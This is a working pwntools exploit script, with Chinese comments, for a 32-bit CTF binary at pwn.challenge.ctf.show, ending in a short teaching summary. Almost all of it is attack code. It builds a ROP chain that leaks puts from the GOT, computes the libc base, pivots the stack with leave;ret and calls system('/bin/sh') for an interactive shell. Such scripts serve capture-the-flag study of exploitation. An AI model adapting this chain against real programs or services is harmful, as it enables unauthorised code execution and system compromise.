from pwn import *
import time

context.log_level = 'debug'

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show', 28204)
elf = ELF('./pwn')
#libc = ELF('./libc.so.6')
libc = ELF('./libc-2.23.so')

# pop_ebp_ret = 0x08048B01：pop ebp; ret gadget的地址
pop_ebp_ret = 0x08048B01

# pop_edi_ebp_ret = 0x08048D8E：pop edi; pop ebp; ret gadget的地址
pop_edi_ebp_ret = 0x08048D8E

# leave_ret = 0x080485D8：leave; ret gadget的地址，用于栈迁移
leave_ret = 0x080485D8

# puts = elf.sym['puts']：puts函数的地址
puts = elf.sym['puts']

# puts_got = elf.got['puts']：puts函数的GOT表地址
puts_got = elf.got['puts']

# arg1 = 0x804b01c：__stack_chk_fail的plt地址
arg1 = 0x804b01c

# readline = 0x080486CB：readline函数的地址
readline = 0x080486CB

# fix_printf = 0x80484b6：修复printf的函数地址
fix_printf = 0x80484b6

# ret = 0x0804846a：ret指令的地址
ret = 0x0804846a

# buf = 0x0804BCF0：缓冲区地址
buf = 0x0804BCF0

# 等待提示信息，发送选择1
io.recvuntil('Your choice: ')
io.sendline('1')
time.sleep(0.5)

# 构造payload，包含ROP链
# p32(ret) + b'AAAAAAAA'：padding
# p32(fix_printf)：调用fix_printf函数
# b'0' + b'H'*85：padding
# p32(pop_ebp_ret) + p32(arg1)：设置ebp为arg1
# p32(puts) + p32(pop_ebp_ret) + p32(puts_got)：调用puts函数泄露puts的GOT表地址
# p32(readline) + p32(pop_edi_ebp_ret) + p32(buf) + p32(0x01010101)：调用readline函数读取shellcode到buf
# p32(pop_ebp_ret) + p32(buf-4) + p32(leave_ret)：执行leave; ret，完成栈迁移
payload = p32(ret) + b'AAAAAAAA' + p32(fix_printf) + b'0' + b'H'*85 + p32(pop_ebp_ret) + p32(arg1) + p32(puts) + p32(pop_ebp_ret) + p32(puts_got) + p32(readline) + p32(pop_edi_ebp_ret) + p32(buf) + p32(0x01010101) + p32(pop_ebp_ret) + p32(buf-4) + p32(leave_ret) +b'\n'

io.send(payload)

# 等待提示信息，发送选择4
io.recvuntil('Your choice: ')
io.sendline('4')

# 接收并解析puts的地址
puts = u32(io.recvrepeat(0.5)[:4])

# 计算libc基址、system函数地址和/bin/sh地址
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
sh = libc_base + next(libc.search(b"/bin/sh"))

# 构造payload，调用system函数执行/bin/sh
payload = p32(system) + p32(0) + p32(sh)
io.sendline(payload)

io.interactive()

"""
【知识点讲解】
1. 题目类型：ROP + stack migration - 32位ROP链 + 栈迁移
2. 核心原理：
   - 利用ROP链泄露puts函数的地址
   - 根据泄露的地址计算libc基址
   - 构造栈迁移，将栈指针指向缓冲区
   - 调用system函数执行/bin/sh
3. 关键步骤：
   - 构造初始ROP链，泄露puts地址
   - 计算libc基址和system函数地址
   - 构造payload执行system('/bin/sh')
4. 执行流程：
   - 交互流程 -> 构造ROP链 -> 泄露puts地址 -> 计算libc基址 -> 执行system获取shell
5. 技术要点：
   - 32位ROP链构造
   - 栈迁移技术
   - libc地址泄露
   - system函数的调用
"""
